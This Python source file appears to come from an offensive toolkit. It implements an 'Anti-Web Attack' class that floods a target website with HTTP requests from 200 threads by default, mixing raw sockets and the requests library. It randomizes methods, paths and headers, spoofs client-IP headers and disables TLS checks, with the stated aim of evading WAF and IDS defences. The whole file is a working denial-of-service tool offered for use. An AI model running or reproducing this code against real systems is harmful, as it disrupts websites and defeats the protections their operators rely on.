#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Anti-Web Attack - Advanced evasion techniques
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
import socket
import ssl
from urllib.parse import urlparse
from colorama import Fore, Style
from core.utils.useragents import get_random_ua

class AntiWebAttack:
    """
    Anti-Web Attack - Uses various techniques to evade WAF/IDS
    - Random HTTP methods
    - Custom headers
    - Slow and low approach mixed with bursts
    """
    
    def __init__(self, target_url, threads=200):
        self.target_url = target_url
        self.threads = threads
        self.parsed = urlparse(target_url)
        self.running = True
        self.request_count = 0
        
        # HTTP methods pool
        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH']
        
        # Paths for different methods
        self.paths = [
            '/', '/index.html', '/index.php', '/wp-admin', '/api/v1',
            '/images', '/css', '/js', '/about', '/contact', '/products',
            '/search', '/login', '/register', '/cart', '/checkout'
        ]
        
    def create_raw_connection(self):
        """Create raw socket connection (bypasses some proxies/WAF)"""
        try:
            host = self.parsed.netloc.split(':')[0]
            port = 443 if self.parsed.scheme == 'https' else 80
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            # Wrap with SSL if HTTPS
            if self.parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            return sock
            
        except Exception as e:
            return None
    
    def send_raw_request(self):
        """Send raw HTTP request (lower level than requests library)"""
        sock = self.create_raw_connection()
        if not sock:
            return False
        
        try:
            # Choose random path and method
            path = random.choice(self.paths)
            method = random.choice(self.methods)
            
            # Build raw request
            ua = get_random_ua()
            request = f"{method} {path} HTTP/1.1\r\n"
            request += f"Host: {self.parsed.netloc}\r\n"
            request += f"User-Agent: {ua}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += f"Accept-Language: {random.choice(['en-US', 'id-ID', 'en-GB'])}\r\n"
            request += "Connection: keep-alive\r\n"
            
            # Add random headers
            for _ in range(random.randint(0, 5)):
                request += f"X-{random.randint(1000, 9999)}: {random.randint(1, 999999)}\r\n"
            
            # For POST/PUT, add content
            if method in ['POST', 'PUT']:
                content = f"data={random.randint(1, 999999)}"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {len(content)}\r\n"
                request += "\r\n"
                request += content
            else:
                request += "\r\n"
            
            # Send request
            sock.send(request.encode())
            
            # Try to read response (optional)
            try:
                response = sock.recv(4096)
            except:
                pass
            
            sock.close()
            return True
            
        except Exception:
            try:
                sock.close()
            except:
                pass
            return False
    
    def attack_worker(self):
        """Worker thread for anti-web attack"""
        while self.running:
            try:
                # Mix between raw sockets and requests library
                if random.random() > 0.5:
                    # Use raw socket
                    success = self.send_raw_request()
                else:
                    # Use requests with weird parameters
                    session = requests.Session()
                    ua = get_random_ua()
                    
                    # Add weird headers that might confuse WAF
                    headers = {
                        'User-Agent': ua,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    
                    response = session.get(self.target_url, headers=headers, timeout=5)
                    success = True
                
                if success:
                    self.request_count += 1
                
                # Random delay to appear human-like
                time.sleep(random.expovariate(2))  # Average 0.5 seconds
                
            except Exception:
                time.sleep(0.1)
    
    def start(self):
        """Start the anti-web attack"""
        print(Fore.YELLOW + "\n   ╰─❯ Starting Anti-Web Attack on " + self.target_url + Style.RESET_ALL)
        print(Fore.YELLOW + "   ╰─❯ Threads: " + str(self.threads) + Style.RESET_ALL)
        print(Fore.YELLOW + "   ╰─❯ Techniques: Raw Sockets, Header Spoofing, Method Randomization" + Style.RESET_ALL)
        print(Fore.YELLOW + "   ╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
        
        # Start workers
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker)
            worker.daemon = True
            worker.start()
        
        # Monitor
        try:
            last_count = 0
            while self.running:
                time.sleep(5)
                new_req = self.request_count - last_count
                last_count = self.request_count
                print(Fore.CYAN + "   ╰─❯ Requests: " + str(self.request_count) + " | Rate: " + str(new_req/5) + " rps" + Style.RESET_ALL)
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(Fore.RED + "\n   ╰─❯ Stopping Anti-Web Attack..." + Style.RESET_ALL)
        print(Fore.RED + "   ╰─❯ Total requests: " + str(self.request_count) + Style.RESET_ALL)
